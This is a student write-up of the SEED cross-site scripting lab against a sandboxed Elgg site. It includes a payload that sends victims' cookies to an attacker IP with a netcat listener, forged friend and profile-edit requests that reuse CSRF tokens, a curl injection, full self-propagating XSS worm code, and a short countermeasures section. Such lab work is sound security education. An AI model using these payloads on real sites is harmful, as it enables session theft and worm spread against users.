# SEED LAB: Cross-Site Scripting Attack Report 

## Configure before starting

If you only want to know whether tasks are completed, please feel free to jump this Section. It is related to our works, but it is not about the tasks. However, they are essential if you want to get the same results as me step by step. 

### 0.1 Configure Virtual Machine

In this report, we cloned another virtual machine and set the two machines in same NAT networks.
```shell
# Commands for the server
$ echo 'export PS1="[SEV]\[\e[1;36m\]\u@\h\[\e[m\]:\w\\$ "' >> ~/.bashrc
$ source ~/.bashrc
# Commands for the attacker
$ echo 'export PS1="[ATC]\[\e[1;31m\]\u@\h\[\e[m\]:\w\\$ "' >> ~/.bashrc
$ source ~/.bashrc
```
We also used the commands above to configure their bash prompt, which can help us identify them more easily. As the image shows, we used the left one as server and right one as attacker.  

<img style="width:100%"https://codimd.s3.shivering-isles.com/demo/uploads/upload_b8211abe61ddc9fe4d7eddc7581cc0ec.png"/>


### 0.2 DNS Configuration

We first modified the "*/etc/hosts*" file on the **server** to map the url of "*www.example.com*" to attacker's IP, because we assumed the website is under the control of the attacker. We attached the following line: 
``` shell
# in victim server's "/etc/hosts" file. 
# 10.0.2.15 is IP address for the attacker. 
10.0.2.15    www.example.com
```

### 0.3 Apache Configuration

After that, we added the following lines to **attacker's** "*/etc/apache2/sites-available/000-default.conf*" file. We defined the root directory to "*/var/www/example.com*" (also used the command `sudo mkdir` to create the directory). Furthermore, we made the dir "*/home/seed/Labs/w5/xss*" accessible by a url "*www.example.com/xss*" and also did that for all subdirs. 

``` Apache
<VirtualHost *:80>
        ServerName http://www.example.com
        DocumentRoot /var/www/example.com
        Alias /xss /home/seed/Labs/w5/xss
        <Directory /home/seed/Labs/w5/xss>
                    Require all granted
        </Directory>
</VirtualHost>
```

### 0.4 Restart the service

We executed the command below on **attacker** to make our configuration work.
```
$ sudo service apache2 restart
```
PS. we found that the command `sudo service apache2 start` in task document does **not** work. 

<div style="page-break-after: always;"></div>

## TASK01: Malicious Message to Display an Alert Window

### 1.1 Insert malicious codes directly

We logged in the website *http://www.xsslabelgg.com* as Samy (from the victim browser). We used the username and password in our task document, which are also listed below .
>  UserName: samy
>  Password: seedsamy

As image below shows, We modified the content of his **Brief description** to a simple javascript code section, `<script>alert("XSS");</script>`. We also made its public to everyone, so that it could be insert to the webpage when someone access Samy's profile.  

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_a9c14d55f1c715b89340a87e4a7b5175.png"/>


After that, we logged in as Alice to access Samy's profile.
>  UserName: alice
>  Password: seedalice

There was a popped-out dialogue box after opening the webpage, which actually proven there is a XSS vulnerability here.  

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_92f36c2a7ddb0c849eeaf5e69745a000.png"/>



### 1.2 Import malicious codes by a link
This case we modified the content of Samy's **Brief Description** as the code section below.  
```javascript
<script type="text/javascript"  
    src="http://www.example.com/xss/task01/myscripts.js">
</script>
```
As the image below shows, the imported script also worked.  

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_9af32eb5a53945574188dd9a44636f6b.png"/>

<div style="page-break-after: always;"></div>

## TASK02: Posting a Malicious Message to Display 

We directly modified the code in the "*myscripts.js*" to the code below. (We also removed all cached data)
```javascript
alert(document.cookie);
```
As the image below shows it successfully accessed data in the cookie of the website.  

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_f1249fbf6446ae97be27d578e6088274.png"/>


We also tried to directly insert the code `<script>alert(document.cookie);</script>`. As the image shows, it also worked.  

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_fe6c20031ba1210c88eea2f7aae87748.png"/>


(PS. the popped-out values were different because we changed the login account from Alice to Samy)

<div style="page-break-after: always;"></div>

## TASK03: Stealing Cookies from the Victim’s Machine

### 3.1 Update the Brief Description

We update Samy's **Brief Description** with the following codes. 
``` javascript
<script>
    // 10.0.2.15 is IP address of the attacker
    document.write(
        "<img src=http://10.0.2.15:5555?c=" 
        + "scape(document.cookie)" + ">"
    );
    alert(document.cookie);
</script>
```

### 3.2 Listening from attacker

We used the `netcat` command with "-l" option to listening the data send to attacker. The command are listed in section below. 
```shell 
$ nc -l 5555 -v
```

### 3.3 Stealing cookie when some accessed the profile

We logged-in with Alice's account, and then accessed Samy's profile. The image below shows the webpage after Alice accessing.  

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_a1749e8855953aadad7abc0c0f58dfd1.png"/>

The image below is the output of `netcat` command, which proven that the attacker obtained the data in cooke. (Value for `Elgg` is same with that in popped-up dialog box)  

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_b7253fe295af53901abbc5adebb4923f.png"/>

<div style="page-break-after: always;"></div>


## TASK04: Becoming the Victim’s Friend

### 4.1 Launching an attack

#### 4.1.1 Obtaining the attack url

As image below shows, we used the "**HTTP Header Live**" to observe changes after clicking the "add friend" button. 

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_d788e544b329ca2d12d992c63f3e82ee.png"/>


We found a GET request to the following url was created. 
```url
http://www.xsslabelgg.com/action/friends/add
    ?friend=47
    &__elgg_ts=1633361406
    &__elgg_token=fb9ioaqc6YBbRths9drGog
```
There are three arguments, `friend`, `elgg_ts` and `elgg_token`. The `friend=47` is Samy's user id, so it is hard-coded into our url. The others two are handled by Javascript. Therefore, we completed our value of the `sendurl` as below: 
```javascript 
// We omit other part of the code sections
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
var friend = 'friend=47'
var sendurl="http://www.xsslabelgg.com/action/friends/add?"+friend+ts+token;
```
<br/><br/>

#### 4.1.2 Making it work 

We added this codes into Samy's "**About Me**" as HTML. After that, we logged-in as Boby to access Samy's profile. 
> Boby's Account: boby
> Body's Password: seedboby

The image below shows that Samy became Boby's friend after accessing Samy's profile. Specifically, we found the codes were successfully inserted into "**About Me**" by the "Element Inspector" on the left. We also saw that the GET request occurred in "HTTP Header Live" on the right. The bottom of the page shows that Samy had already been added as Boby's friend without clicking the "Add friend" button.

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_477765f180b8e046e74fa5fb6789a081.png"/>


### 4.2 Answer Q01: The purpose of Lines ➀ and ➁

The two variables `__elgg_ts` and `elgg_token` are used by "Elgg" to prevent the CSRF attack. Specifically, the server generates the two variables and inserts them into the HTML file. Any requests without the two values will be treated as cross-site requests and then be discarded.
In the two lines ➀ and ➁, we accessed the timestamp ( `__elgg_ts`) and secret token (`elgg_token`) from the corresponding JavaScript variables. And then, we inserted them into our request, which bypassed the protection mechanism. If we did not added them, our request will be discarded by the server. 

### 4.3 Answer Q02: The attack to editor only "**About Me**"

On the textbook, it mentioned various methods to break the editor limitation on "**About Me**". The first is to use the browser extension to remove those formatting data from HTTP requests. The second is to use the curl to send the request directly from terminal, which were implemented in our report. 

#### 4.3.1 Observing the request after saving profile changes

We used the HTTP Header Live to observe the request after saving the profile changes. The image below was what we captured: 

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_6b5989d7572892a5f4bfd87df0e25f89.png"/>

In there, we noticed that it is a POST request. As to the arguments, all of them are in the request body instead of the URL. There are elgg timestamp (i.e. `__elgg_ts`) and elgg token (i.e. `__elgg_token`). The data is put in the `description` field, and there are also two fields related to Samy (name and guid). 

#### 4.3.2 Obtaining the arguments

We used the console in Firefox development tool to output all arguments essential for the requests. The images below shows what we got here. 

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_efebb3cf422f0f37ce2d591d495e8ad3.png"/>

Furthermore, we constructed `<script>alert('FROM CURL');</script>` as test code in there. If the request works, we will see a popped-up dialogue box with message "FROM CURL". We converted all special characters into URI encoding and encoded codes were `%3Cscript%3Ealert%28%27FROM%20CURL%27%29%3B%3C%2Fscript%3E`.


#### 4.3.3 Sending the request by CURL

We used `curl` in there. The option `-H`, `-d` and `--cookie` were used to specify  the request header, request body and cookie. 

```
curl -X POST -v \
    -H "Host: www.xsslabelgg.com" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "=&name=Samy&guid=47\
    &__elgg_ts=1633558501\
    &__elgg_token=wXxFdTkiU3WWdxXq0os9Ng\
    &description=%3Cscript%3Ealert%28%27FROM%20CURL%27%29%3B%3C%2Fscript%3E\
    &accesslevel[description]=2" \
    --cookie "Elgg=7b1fpkj89h11a7rqceu82lqq26" \
    http://www.xsslabelgg.com/action/profile/edit
```

After executing the command, we accessed Samy's profile and we saw the popped-up box. 

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_3f0da66f530e38ceaf06779fb46d60eb.png"/>

It proven that we modified Samy's "**About Me**" by CURL. 

<div style="page-break-after: always;"></div>

## TASK05: Modifying the Victim’s Profile

### 5.1 Launching attack

#### 5.1.1 Obtaining the attack url

As we did in the task04, we also used the HTTP Header Live to observe the url. The image below shows the POST request captured by the add-on. 

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_d1e6c70fd8945a7a85661db8b115d49e.png"/>


We found the url should be "*http://www.xsslabelgg.com/action/profile/edit*". Besides, we also noticed that all data, such as timestamp token and description etc., were put into the request body. 

#### 5.1.2 Making it work
Therefore, we finished our codes as the codes section below: 
```javascript
// We defined the value in description and also made it public
var decription = "&description=Description is changed."
    + "&accesslevel[description]=2";
var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
var content = `&name=${userName}` + guid + ts + token + decription 
// The Samy's id is 47
var samyGuid = 47;
```
The image below shows that Bob's profile was changed after accessing Samy's page. 

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_3f21f42d313e6067dcb2b8b2d03f63fc.png"/>



### 5.2 Answer Q3: if-statement in Line ➀

#### 5.2.1 Why do we need Line ➀

The line ➀ actually check whether the current user is Samy. If it is, the script will not overwrite the data in his "**About Me**". It is essential because the webpage will automatically jump to the user profile after modifying. Therefore, Samy's code will also be replaced by the plaintext here if there is no such statement. 

#### 5.2.2 After removing Line ➀

We modified our previous code at line ➀ to `if(true) {`. The image below show the change after saving the profile. The codes in "**About Me**" was automatically changed to a plaintext. 

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_64d2f47623ccaef475ed0374f5c59d6f.png"/>

<div style="page-break-after: always;"></div>

## TASK06: Self-Propagating XSS Worm

### 6.1 Link Approach

We implemented the attack by putting a malicious Javascript file into the "*www.example.com/xss/task06/xss_worm.js*". 
After that, we imported the malicious JS file from the "**About Me**" by the codes below:

```html
<script type="text/javascript" 
    src="http://www.example.com/xss/task06/xss_worm.js">
</script>
```

The codes in the "*xss_worm.js*" file is shown in the codes section below. There are two functions: `infectToProfile` and `addSamyAsFriend`. In the first, it will modify the value of the "**About Me**" to make it same with the Samy's one. As to the second, it make the victim add Samy as friend. 

```javascript
// Infect To Profile Function 
function infectToProfile(){
    let sendurl = "http://www.xsslabelgg.com/action/profile/edit";
    let description = '<script type=text/javascript '
        + 'src="http://www.example.com/xss/task06/xss_worm.js">'
        + '</' + 'script>'; // To avoid the end tag issue
    let content = '&name=' + elgg.session.user.name
        + '&guid=' + elgg.session.user.guid
        + '&__elgg_ts=' + elgg.security.token.__elgg_ts //Elgg Timestamp
        + '&__elgg_token=' + elgg.security.token.__elgg_token //Elgg Token
        + '&description=' + description + '&accesslevel[description]=2'; 
    let Ajax=new XMLHttpRequest();
    Ajax.open("POST",sendurl,true);
    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
}
// Add Samy As Friend 
function addSamyAsFriend () {
    let sendurl = 'http://www.xsslabelgg.com/action/friends/add?friend=47'
        +'&__elgg_ts=' + elgg.security.token.__elgg_ts //Elgg timestamp
        +'&__elgg_token=' + elgg.security.token.__elgg_token; //Elgg Token
    let Ajax = new XMLHttpRequest();
    Ajax.open("GET",sendurl,true);
    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    Ajax.send();
}

window.onload = function () {
    // Make sure it will not changed Samy's profile
    // And ensure Samy will not add himself as friend 
    if(elgg.session.user.guid!=47){ 
        infectToProfile();
        addSamyAsFriend();
    }
}

```

As the image below shows, the code worked well. We logged in as Boby and then accessed Samy's profile. After that, Boby's "**About Me**" was replaced by the code, and he also added Samy as a friend. 

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_dec1ac7be0e5d7bd7808252fec128381.png"/>


(PS. we ensured that Samy is not friend of Boby before starting the task)

### 6.2 DOM Approach

In there, we reused most codes in the last section. The code section shows the changes we made. There are two: the first is the surrounded `<script>` tag with id, "worm", and the second is about the function `infectToProfile`.  Specifically, we changed the value of the `description`, in which we replaced the previous URL-importing to the actual codes. And we also used the `encodeURIComponent` function to convert it to URL encoding. 

```HTML
<script id=worm>
function infectToProfile(){
    ...    
    let description = encodeURIComponent(
        '<script id=worm>'
        + document.getElementById("worm").innerHTML
        + '</' + 'script>'
    ); 
    ...
}
function addSamyAsFriend () {
    ...
}
window.onload = function () {
    // Make sure it will not changed Samy's profile
    // And ensure Samy will not add himself as friend 
    if(elgg.session.user.guid!=47){ 
        infectToProfile()
        addSamyAsFriend()
    }
}
</script>
```

We put the codes directly into Samy's "**About Me**", and redid the steps in last section. The image below shows it also worked well when Boby accesses Samy's profile.

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_431b17316feb0b38f97265a518e4e48a.png"/>

<div style="page-break-after: always;"></div>

## TASK07: Countermeasures

### 7.1 Preparation

In the task, we prepared two victim: Boby and Alice. The attacker is Samy. Charlie's account was unattacked before starting the task.

### 7.2 HTMLawed only

We logged-in the system as Admin and activated the `HTMLawed` protection without the `htmlspecialchars`. After that, we used Charlie to access Boby's profile. The image below was what we saw. The previous `<script>` tag are replaced by `<p>` and the newline tag `<br>` was added to each lines of the codes.

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_2edad8f5ab2aeef1badd7987c170834f.png"/>


### 7.3 Turn on htmlspecialchars

We uncommented the lines in the image below. And then, we edited Alice's and Samy's profiles, and saved all changes.

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_ef995909092db2e8d23e9179fce6c736.png"/>


We found that all URL was converted to a link after activating such countermeasure.

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_1ea10fa42724a52579250cff45b5b242.png"/>



After that, we also tried to edit Samy's profile. In the editor, we found the data in the HTML editor had already been converted. For example, the special characters in the string, the'<' and '>', became the `&lt;` and `&gt;`. We expected the email address to be also converted, but our codes have no such kind of strings. 

<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_66d8bd25a9d091de58e6ff4985db98b8.png"/>

